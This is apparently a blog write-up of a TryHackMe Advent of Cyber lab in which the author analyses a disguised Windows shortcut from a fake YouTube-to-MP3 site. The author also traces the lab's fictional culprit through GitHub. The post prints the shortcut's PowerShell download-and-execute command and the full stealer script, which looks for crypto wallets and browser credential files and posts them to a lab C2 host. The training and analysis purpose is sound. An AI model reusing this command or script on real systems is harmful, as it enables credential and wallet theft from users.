---
title: "Maybe SOC-mas music, he thought, doesn't come from a store?"
seoTitle: "Advent of Cyber 2024: Day 1"
seoDescription: "Taji Abdullah investigates a suspicious website"
datePublished: Wed Dec 04 2024 17:57:51 GMT+0000 (Coordinated Universal Time)
cuid: cm4a6y4zd000n07la0mk02ol2
slug: maybe-soc-mas-music-he-thought-doesnt-come-from-a-store
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1744583422681/6d6af0ee-1a7d-4ab9-8be3-1f4a69d47f87.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1744583446587/33d004f4-85a7-4f48-bf27-8b8d82987b41.png
tags: cybersecurity-1, tryhackme, adventofcyber2024

---

The learning objectives:

* Learn how to investigate malicious link files.
    
* Learn about OPSEC and OPSEC mistakes.
    
* Understand how to track and attribute digital identities in cyber investigations.
    

Day 1 began by investigating a YouTube MP3 converter website. This particular site was having some negative feedback from the organizers of SOC-mas as they shared it among themselves. It would seem a we might have watering hole attack?

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1733330033873/3d9c4f64-d033-4cdf-bc59-d8d80c63b11d.png align="center")

YouTube converter sites aren’t new and have been around for many years. They are a popular way of getting audio from YouTube videos. These type of sites are known to have risks in the form of:

* **Bundled malware**: Some converters come with malware that trick users into unknowingly running it.
    
* **Malvertising**: Malicious advertisements that can exploit vulnerabilities in a user's system, which could lead to infection.
    
* **Phishing scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
    

So the idea is to determine what lurks in this particular YouTube converter site. The first thing I did was give the site a YouTube video URL to convert. This let me inspect the websites output. I was provided with zip file downloaded within the virtual machine I was using.

Once extracted, I found that the contents were two files:

* song.mp3
    
* somg.mp3
    

Right away one of the files looked off. I began to inspect the regular looking file first by running the file command from my terminal:

```plaintext
taca@kali:~$ file song.mp3
download.mp3: Audio file with ID3 version 2.3.0, contains:MPEG ADTS, 
layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

Nothing out of the ordinary here. I then ran the same command on the other file:

```plaintext
taca@kali:~$ file somg.mp3
somg.mp3: MS Windows shortcut, Item id list present, Points to a file 
or directory, Has Relative path, Has Working directory, Has command 
line arguments, Archive, ctime=Sat Dec 01 07:14:14 2024, mtime=Sat Dec 
01 07:14:14 2024, atime=Sun Dec 01 07:14:14 2024, length=448000, 
window=hide
```

This output indicates this file is a Windows shortcut. This is used to link to an application, folder, or another file. They can also be used to run commands. These are what people typically have on their computer desktops.

To inspect this file deeper is ran ExifTool, I truncated the output here:

```plaintext
 taca@kali:~$ exiftool somg.mp3
...
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

This brings to light a PowerShell command! This command does a few things:

* The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
    
* The `DownloadFile` method pulls a file (`IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the `C:\\ProgramData\\` directory on the target machine.
    
* Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.
    

The contents of the downloaded file are:

```plaintext
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

This script when it runs collects cyrypto wallets and browser credentials, then sends them to a command and control server. It also reveals the attackers OPSEC(Operational Security) breadcrumbs left behind:

```plaintext
Created by the one and only M.M.
```

Since the file was downloaded from GitHub, I ran a search there and found this:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1733334324971/92c5882d-dda2-40e6-b33e-a6cdc299ea7a.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1733334437617/8b81172c-5beb-493c-820f-a803bf4a32bf.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1733334477571/a1d746a3-48cd-44b9-bc73-3d8d13659272.png align="center")

Next I searched the GitHub profile of MM-WarevilleTHM and was able to find more info about who the one and only M.M. is:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1733334750133/25045fe8-579c-4567-a43a-956f0c81c0d2.png align="center")

Got em! The Mayor of Wareville is the one behind the issues with this website. Although the website and the PowerShell script allude to the culprit being Glitch.